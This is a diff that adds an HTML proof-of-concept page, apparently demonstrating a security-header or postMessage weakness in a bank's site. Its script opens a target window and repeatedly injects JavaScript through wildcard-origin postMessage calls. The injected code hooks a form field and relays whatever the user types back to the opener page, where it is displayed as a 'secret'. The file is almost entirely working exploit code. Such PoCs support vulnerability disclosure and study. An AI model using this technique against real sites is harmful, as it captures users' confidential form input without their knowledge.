@@ -1,0 +1,43 @@
+<html>
+    <head>
+        <meta charset="utf-8">
+
+    </head>
+    <body>
+
+        POC based on https://isitsafe.co.uk/SecurityHeaders/halifax/
+        <div>
+            <p>Secret: <span id="secret"></span></p>
+        </div>
+
+        <script type="text/javascript">
+
+            function openTarget() {
+                openedWindow=window.open("sop-target.html","sopttarget");
+                intercept();
+                return false;
+            }
+
+            openTarget();
+
+            window.addEventListener('message',function(event) {
+            var eventData=event.data;
+            var retryTimer=null;
+
+            if (eventData.response=='valid') {
+                clearTimeout(retryTimer);
+            }
+            if (eventData.secretChange) {
+                document.getElementById('secret').innerText=eventData.secretChange;
+            }
+            });
+
+            function intercept() {
+                openedWindow.postMessage("window.parentPost=function(name,val) { try { var obj={};obj[name]=val;window.opener.postMessage(obj,'*'); } catch (e) { console.log(e); } }","*");
+                openedWindow.postMessage("document.forms[0].elements['text'].addEventListener('change',function() {parentPost('secretChange',this.value);})","*");
+
+                retryTimer=setTimeout(intercept,500);
+            }
+        </script>
+    </body>
+</html>
